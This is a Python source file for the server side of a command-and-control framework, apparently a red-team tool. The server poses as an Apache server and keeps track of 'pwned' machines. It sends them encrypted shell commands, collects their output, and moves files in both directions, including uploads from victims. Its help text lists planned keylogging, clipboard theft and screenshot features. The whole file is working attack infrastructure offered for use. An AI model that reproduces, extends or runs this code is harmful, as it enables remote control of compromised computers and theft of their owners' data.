"""
Command & Control Server Side Coding
Author: Davood Yahay(D.Yakuza)
"""

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from os import path, mkdir, listdir, system
from platform import system as platform_system
from urllib.parse import unquote_plus

# Custom Features Import
from datetime import datetime
from colorama import Fore
from inputimeout import inputimeout, TimeoutOccurred
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES

from encryption import cipher
# Settings Variables(Constants) Importing
from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
                      BIND_ADDR, PORT, FILE_SEND, INCOMING, OUTGOING, ZIP_PASSWORD, SHELL_WINDOWS, SHELL_LINUX, SHELL,
                      LOG)


def get_new_client():
    """Function to check if other sessions exist if none do Re-Initialize variables.
    However, if sessions do exist, Allow the Red Team operator to pick one to become a new active session"""

    # this variable must be global, as they will often be updated via multiple session
    global activeClient, pwnedDict, pwnedId, cwd
    # Delete Lost Connection Client from pwnedDict
    # del pwnedDict[activeSession]

    # Reinitialize cwd to its starting value of tilde
    cwd = "~"

    # If pwnedDict is empty, Re initialize pwnedId & activeSession
    if len(pwnedDict) == 1:
        print(Fore.LIGHTBLUE_EX + "\n[...] Waiting for a new Connection!. \n" + Fore.RESET)
        pwnedDict = {}
        pwnedId = 0
        activeClient = 1

    # if pwnedDict have items, print it on display to choose active session and switch to it
    else:
        # display sessions in our dictionary and choose one of them to switch over to
        while True:
            for key, value in pwnedDict.items():
                if key != activeClient:
                    print(f"{Fore.LIGHTGREEN_EX}{key}{Fore.MAGENTA} - {Fore.LIGHTYELLOW_EX}{value}{Fore.RESET}")

            try:
                newSession = int(input(f"{Fore.LIGHTGREEN_EX}\n[+] Choose Session Number "
                                       f"to Make it Active => {Fore.RESET}"))
            except ValueError:
                print(Fore.LIGHTRED_EX + "\n[-] Enter Number Only; You must choose a pwned ID of "
                                         "one of the sessions show on the Screen\n" + Fore.RESET)
                continue
            # Ensure entered pwnedId exists in pwnedDict and set activeSession to it
            if newSession in pwnedDict and newSession != activeClient:
                oldActiveSession = activeClient
                activeClient = newSession
                del pwnedDict[oldActiveSession]
                print(Fore.LIGHTGREEN_EX + f"\n[+] Active Session is Now Set on: "
                                           f"{pwnedDict[activeClient]} \n" + Fore.RESET)
                break
            # if newSession not in pwnedDict actually wrong chosen number
            else:
                print(Fore.LIGHTRED_EX + "\n[-] => Wrong Choice; You must choose One of the Pwned ID's "
                                         "you see on the Screen\n")
                continue


class C2Handler(BaseHTTPRequestHandler):
    """This class is a child of the BaseHTTPRequestHandler class.
    It handles all http requests arrived from the client
    """

    # Make our Server look like an Up-to-date Apache2 Server on CentOS
    server_version = "Apache/4.6.2"
    sys_version = "(CentOS)"

    def do_GET(self):
        """this method handles all http GET Requests arrived at the C2 server.
        first send 404 status codes"""

        global activeClient, clientAccount, clientHostname, pwnedId, pwnedDict, cwd

        if self.path.startswith(CMD_REQUEST):
            # Split out the Client from http GET Request
            client = self.path.split(CMD_REQUEST)[1]

            # Decrypt the client data
            client = cipher.decrypt(client.encode()).decode()

            # get the client IP from the client_address built-in property
            clientIp = self.client_address[0]

            # Split out the client Account Name
            clientAccount = client.split("@")[0]

            # Split out the client Host Name
            clientHostname = client.split("@")[1]

            # Check the client is existing in pwnedDict
            if client not in pwnedDict.values():
                # Send http Response code and header back to a client
                self.http_response(404)

                # Increment pwnedId and add the client to pwnedDict using pwnedId as Dict
                pwnedId += 1
                pwnedDict[pwnedId] = client

                # Print Pwned Client Message & Information
                print(Fore.LIGHTGREEN_EX + f"[+] {clientAccount}@{clientHostname}({clientIp}) has been Pwned \n" + Fore.RESET)

                # Write log file to LOG(pwned.log)
                with open(LOG, "a") as fileHandle:
                    fileHandle.write(f"{datetime.now()}, {self.client_address}, {pwnedDict[pwnedId]}\n")

            # If the client in pwnedDict and also is Active Session    
            elif client == pwnedDict[activeClient]:
                # if INPUT_TIMEOUT is set, run inputimeout instead of regular input
                if INPUT_TIMEOUT:
                    try:
                        # Azure kill a waiting HTTP GET Session after 4 minutes(230 seconds in Windows & 240 in Linux)
                        # so we must handle input with a timeout as below
                        command = inputimeout(f"({clientIp}){clientAccount}@{clientHostname}:{cwd} => ",
                                              timeout=INPUT_TIMEOUT)

                    # if a timeout Occurs on our input, do a simple command to trigger a new session
                    except TimeoutOccurred:
                        command = KEEP_ALIVE_CMD
                else:
                    # Collect Command from regular input to run on the c2 client
                    command = input(Fore.RESET + f"({clientIp}){clientAccount}@{clientHostname}:{cwd} "
                                                 f"=> " + Fore.LIGHTYELLOW_EX)
                    print(Fore.RESET)

                if command.startswith("server "):
                    # The 'server show clients' commands will display pwned systems and our active session information
                    if command == "server show clients":
                        # Print pwned systems and active session information to our screen
                        print(f"{Fore.LIGHTCYAN_EX}Available Pwned Machines:{Fore.RESET}")
                        printLast = None
                        for key, value in pwnedDict.items():
                            if key == activeClient:
                                printLast = str(key) + " - " + value
                            else:
                                print(f"{Fore.LIGHTGREEN_EX}{key}{Fore.MAGENTA} - "
                                      f"{Fore.LIGHTYELLOW_EX}{value}{Fore.RESET}")
                        print(f"\n{Fore.LIGHTCYAN_EX}Your Active Sessions: {Fore.RESET}",
                              f"{Fore.LIGHTYELLOW_EX}{printLast}{Fore.RESET}\n", sep="\n")

                    # The 'server control PWNED_ID' command allow us to change active session
                    elif command.startswith("server control "):
                        # Make sure the supplied pwnedId is Valid, and if so, make the Switch
                        try:
                            possibleActiveClient = int(command.split()[2])
                            if possibleActiveClient in pwnedDict:
                                activeClient = possibleActiveClient
                                print(f"Waiting for {pwnedDict[activeClient]} to Wake up.")
                            else:
                                raise ValueError
                        except (ValueError, IndexError):
                            print(f"{Fore.LIGHTRED_EX}\n[-] => You must enter a Proper Pwned ID. \n"
                                  f"{Fore.GREEN}[+] => {Fore.RESET}Use {Fore.LIGHTYELLOW_EX}server show clients "
                                  f"{Fore.RESET}command to see Available PwnedID's\n")

                    elif command.startswith("server zip "):
                        # Initialize filename to avoid PyCharm Warning
                        filename = None

                        # Zip Encrypted file that is setting in our outgoing folder
                        try:
                            # Check if a supplied file exists in outgoing dir
                            filename = command.split()[2]

                            if not path.isfile(f"{OUTGOING}/{filename}"):
                                raise OSError

                            with AESZipFile(f"{OUTGOING}/{filename}.zip", "w",
                                            compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
                                zipFile.setpassword(ZIP_PASSWORD)
                                zipFile.write(f"{OUTGOING}/{filename}", arcname=filename)
                                print(f"{Fore.LIGHTGREEN_EX}[+]-Server => {OUTGOING}/{filename} is now Zip-Encrypted "
                                      f"=> {Fore.RESET}{OUTGOING}/{filename}.zip \n")

                        except OSError:
                            print(f"{Fore.LIGHTRED_EX}\n[-] => Don't Access to {OUTGOING}/{filename}. {Fore.RESET}\n")
                        except IndexError:
                            print(f"{Fore.LIGHTRED_EX}\n[-] => You must enter a filename located in {OUTGOING} to "
                                  f"Zip-Encrypt it. {Fore.RESET}\n")

                    # server unzip command allows us to unzip decrypted zip files in incoming folder on C2 Server
                    elif command.startswith("server unzip"):
                        # Initialize filename to avoid PyCharm Warning
                        filename = None

                        # Unzip AES Encrypted file that is setting in our storage folder
                        try:
                            filename = command.split()[2]
                            with AESZipFile(f"{INCOMING}/{filename}") as zipFile:
                                zipFile.setpassword(ZIP_PASSWORD)
                                zipFile.extractall(INCOMING)
                                print(f"[+]-Server => {INCOMING}/{filename} is now Unzipped and Decrypted. \n")
                        except FileNotFoundError:
                            print(f"{Fore.LIGHTRED_EX}[-]-Server => {filename} was not found in {INCOMING}. \n")
                        except OSError:
                            print(
                                f"{Fore.LIGHTRED_EX}[-]-Server => OS Error when Unzipped-Decrypted {filename} in {INCOMING}.\n")
                        except IndexError:
                            print(
                                f"{Fore.LIGHTRED_EX}[-]-Server => You must enter a filename located in {INCOMING} to Unzip-Decrypt it. \n")

                    # The 'server list DIRECTORY' allows us to list files in a folder on the C2 Server
                    elif command.startswith("server list"):
                        directory = None
                        try:
                            directory = command.split()[2]
                            print(*listdir(directory), sep="\n")
                        except NotADirectoryError:
                            print(f"{Fore.LIGHTRED_EX}[-]-Server => {directory} is not a Directory.{Fore.RESET}")
                        except FileNotFoundError:
                            print(f"{Fore.LIGHTRED_EX}[-]-Server => {directory} was not found on the C2 Server.{Fore.RESET}")
                        except IndexError:
                            print(*listdir(), sep="\n")

                    elif command == "server exit":
                        # Shutting Down the C2 Server
                        print(Fore.LIGHTMAGENTA_EX + f"\n[*] Server: {server.server_address[0]} has been shutting down.\n"
                                                 f"{Fore.LIGHTBLUE_EX} Goodbye Ninja,,, 🥷🥷🏽🥷🏿🥷🏻🥷🏽 \n")
                        server.shutdown()

                    elif command.startswith("server shell"):
                        print(f"{Fore.LIGHTGREEN_EX}[+]-Server => Use {Fore.LIGHTMAGENTA_EX}Control+D{Fore.LIGHTGREEN_EX} "
                              f"or Type {Fore.LIGHTMAGENTA_EX}exit {Fore.LIGHTGREEN_EX} to return to the C2 Server's "
                              f"Terminal window.\n{Fore.RESET}")

                        # Detect os using platform.system() importing as "platform_system",
                        # after detect Based on the OS, run the shell command
                        if platform_system() == "Windows":
                            print(f"{Fore.LIGHTBLUE_EX}[+]-Server => Windows Shell(CMD) is Running.\n{Fore.RESET}")
                            system(SHELL_WINDOWS)

                        elif platform_system() == "Linux":
                            print(f"{Fore.LIGHTBLUE_EX}[+]-Server => Linux Shell(Bash) is Running.\n{Fore.RESET}")
                            system(SHELL_LINUX)

                        # Change SHELL to Change shell for Un Recognized OS
                        else:
                            print(f"{Fore.LIGHTRED_EX}[-]-Server => OS {Fore.BLUE}({platform_system()}){Fore.LIGHTRED_EX}"
                                  f" Not Recognized, but BASH shell by default is Running\n{Fore.RESET}")
                            system(SHELL)

                    elif command == "server help":
                        # Print Client Commands
                        print("Client Commands:",
                              "client download FILENAME - transfer a file from the server to the client",
                              "client upload FILENAME - transfer a file from the client to the server",
                              "client zip FILENAME - zip and encrypt a file on the client",
                              "client unzip FILENAME - unzip and decrypt a file on the client",
                              "client kill - permanently shutdown the active client",
                              "client delay SECONDS - change the delay setting for a client's reconnection attempts",
                              "client get clipboard - grab a copy of the client's clipboard (coming soon)",
                              "client keylog on - start up a keylogger on the client (coming soon)",
                              "client keylog off - turn off the keylogger on the client and write the results to disk"
                              " (coming soon)",
                              "client screenshot - grab a copy of the client's screens (coming soon)",
                              "client display FILENAME - display an image on the client's screen (coming soon)",
                              "client flip screen - flip a client's screen upside down (coming soon)",
                              "client max sound - turn a client's volume all the way up (coming soon)",
                              "client play FILENAME.wav - play a .wav sound file on the client (coming soon)",
                              "* - run an OS command on the client that doesn't require input",
                              "* & - run an OS command on the client in the background (coming soon)", sep="\n")
                        # Print Server Commands
                        print("\nServer Commands:",
                              "server show clients - print an active listing of our pwned clients",
                              "server control PWNED_ID - change the active client that you have a prompt for",
                              "server zip FILENAME - zip and encrypt a file in the outgoing folder on the server",
                              "server unzip FILENAME - unzip and decrypt a file in the incoming folder on the server",
                              "server exit - gracefully shuts down the server",
                              "server list DIRECTORY - obtain a file listing of a directory on the server",
                              "server shell - obtain a shell on the server", sep="\n")

                    # Must respond to the client after a server command to cleanly finish the connection
                    self.http_response(204)


                # Else Command is not a special,
                # Write it on the Response File and then a client able to read it and run it
                else:
                    # Send 200 status codes Write the Command back to the client as a Response;
                    # must use UTF-8 for encoding
                    try:
                        # Send HTTP Response Code and Header back to the client
                        self.http_response(200)

                        # Write the Command back to the client as a Response; must use UTF-8 for encoding
                        self.wfile.write(cipher.encrypt(command.encode()))
                    except OSError:
                        # Print lost connection message
                        print(Fore.RED + f"[!] Lost Connection to {pwnedDict[activeClient]}. \n" + Fore.RESET)
                        get_new_client()
                    # Handle KeyboardInterrupt  - Optional
                    except KeyboardInterrupt:
                        print(Fore.LIGHTMAGENTA_EX + "\n[*] User has been Interrupted the C2 Server" + Fore.RESET)
                        exit()
                    # Handle Unknown & Other Errors - Optional
                    except Exception as e:
                        print(Fore.LIGHTRED_EX + "[!] Unknown Error when Sending Command to C2 Client\n" + Fore.RESET)
                        print(f'Error Content:\n{e}')
                    # else block for fixing client kill command for the down client
                    else:
                        # If we have just killed a client, try to get a new session to set it active
                        if command == "client kill":
                            get_new_client()

            # if client in the pwnedDict but is Not Active Session
            else:
                # Send HTTP Response Code and Header back to the client
                self.http_response(404)


        # Follow this code block when a compromised computer is request a file
        elif self.path.startswith(FILE_REQUEST):
            # Split out the encrypted filepath from HTTP GET Request
            filepath = self.path.split(FILE_REQUEST)[1]

            # Encode the file path because decrypt requires it, then decrypt and then decode it
            filepath = cipher.decrypt(filepath.encode()).decode()

            # Get the filename from the filepath to using in a print statement
            filename = path.basename(filepath)

            # Read the requested file into memory and stream it back for the client's GET Response
            try:
                with open(f"{filepath}", "rb") as fileHandle:
                    self.http_response(200)
                    self.wfile.write(cipher.encrypt(fileHandle.read()))

                print(f"[+] Server: {filename} has been Downloaded on C2 client from C2 Server.")

            except OSError:
                print(f"{filepath} was not found on C2 Server.")
                self.http_response(404)

        else:
            """NO body should ever post to our C2 Server other than the above paths; so 
            this code block for security and avoiding posting from attackers"""
            print(Fore.LIGHTRED_EX + f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
                                     f"Why?\n Asking from yourself 🙃 \n")

    def do_POST(self):
        """this method handles all http POST Requests arrived at the C2 server."""

        # Follow code when compromised Computer requesting command
        if self.path == RESPONSE:
            # Print Result of stdout arrived from the client in Plain Text format
            print(self.handle_post_data())

        # Follow code when a compromised Computer is responding with the current directory
        elif self.path == CWD_RESPONSE:
            global cwd
            cwd = self.handle_post_data()

        # Else, if the path is not one of the Defined and Known paths, print a warning message
        else:
            """ NO body should ever post to our C2 Server other than the above paths; so 
        this code block for security and avoiding posting from attackers"""
            print(Fore.LIGHTRED_EX + f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
                                     f"Why?\n Asking from yourself 🙃 \n")

    def do_PUT(self):
        """this method handle all HTTP PUT Requests arrived to C2 Server"""
        # Follow this code block when the compromised machine is sending the file to the server
        if self.path.startswith(FILE_SEND + "/"):
            self.http_response(200)

            # Split out the encrypted filename from http put requests
            filename = self.path.split(FILE_SEND + "/")[1]

            # Encode the file because decryption requires it, then decrypt and then decode
            filename = cipher.decrypt(filename.encode()).decode()

            # Add filename to our storage path
            incomingFile = INCOMING + "/" + filename

            # We need Content Length to properly read in the file
            # noinspection PyTypeChecker
            fileLength = int(self.headers["Content-Length"])

            # Read the Stream coming from our connected client, then decrypt it and write the file to disk on C2 server
            with open(incomingFile, 'wb') as fileHandle:
                uploadData = cipher.decrypt(self.rfile.read(fileLength))
                fileHandle.write(uploadData)

            print(f"[+] Server: {incomingFile} has been Written on C2 Server")

        # Nobody should ever get here using an HTTP Put method
        else:
            print(Fore.LIGHTRED_EX + f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
                                     f"Why?\n Asking from yourself 🙃 \n")

    def handle_post_data(self):
        """ this function handles all http POST Requests arrived at the C2 client."""

        # Send http Response code and header back to the client
        self.http_response(200)

        # Get Content Length value from http headers
        contentLength = int(self.headers.get('Content-Length'))  # noqa

        # gather the client's data by reading in the HTTP POST data
        clientData = self.rfile.read(contentLength)

        # Decode clientData
        clientData = clientData.decode()

        # Remove the HTTP Post Variable and the equal sign from the client's data
        clientData = clientData.replace(f"{RESPONSE_KEY}=", "", 1)

        # HTML/URL decode the Clients data(stdout) and translate "+" to a Space
        clientData = unquote_plus(clientData)

        # Encode the client data because Decryption requires it, then Decrypt, then Decode
        clientData = cipher.decrypt(clientData.encode()).decode()

        # Return Processed clientData
        return clientData

    def http_response(self, code: int):
        """this function sends the HTTP Response codes
        and Headers back to the client"""
        self.send_response(code)
        self.end_headers()

    def log_request(self, code="-", size="-"):
        """Override this function because by default these functions write to screen,
        but we need and want to write logs into a file
        """
        return


# maps to the clients we have a prompt from that 
activeClient = 1

# this is accounts from the client belonging to Active Sessions
clientAccount = ""

# this is a hostname from client belonging to Active Sessions
clientHostname = ""

# Use to count and track each client connecting to C2 Servers(pwned by C2 Server)
pwnedId = 0

# Track all pwned clients; key = pwned_id and value is unique from each client.
# value follow this pattern => (account@hostname@epoch time)
pwnedDict = {}

# If the INCOMING Directory is not present on our c2 server, Create it
if not path.isdir(INCOMING):
    mkdir(INCOMING)

# If the OUTGOING Directory is not present on our c2 server, Create it
if not path.isdir(OUTGOING):
    mkdir(OUTGOING)

# This a current working directory from the client belonging to active session
cwd = "~"

# Instance from HTTP Server
# noinspection PyTypeChecker
server = ThreadingHTTPServer((BIND_ADDR, PORT), C2Handler)

# Print C2 Server Side Message for avoid complexing in test operation
print(Fore.LIGHTMAGENTA_EX + "\n[+]-------------C2 Server Side-------------[+]\nWait for C2 Client...\n" + Fore.RESET)

# Run Server in infinity Loop
try:
    server.serve_forever()
except KeyboardInterrupt:
    print(Fore.LIGHTRED_EX + f"\n[*] Server: {server.server_address[0]} has been shutting down.\n{Fore.BLUE} "
                             f"Goodbye Ninja,,, 🥷🥷🏽🥷🏿🥷🏻🥷🏽 \n")
    server.shutdown()
